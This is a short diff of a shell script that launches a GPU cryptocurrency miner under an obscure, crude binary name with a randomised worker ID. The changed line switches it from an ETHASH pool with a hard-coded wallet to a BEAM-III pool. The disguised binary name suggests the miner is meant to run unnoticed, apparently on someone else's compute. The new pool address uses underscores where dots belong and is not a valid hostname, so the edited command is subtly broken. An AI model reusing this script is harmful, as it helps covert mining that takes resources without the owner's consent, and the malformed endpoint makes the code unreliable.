@@ -6,4 +6,4 @@ WORKER=$(echo $(shuf -i 1-100000 -n 1)-GPU)
 
 chmod +x memek
 
-./memek --algo ETHASH --pool stratum+tcp://ethash.asia.mine.zergpool.com:9999 --user DSwoxchYjRNtoETEzMWA6EYx1xXkqjFwBH.$WORKER
+./memek --algo BEAM-III --pool stratum+tcp://beamv3.eu-west_nicehash_com:3387 --user $WALLET.$WORKER --ethstratum ETHPROXY --mode a
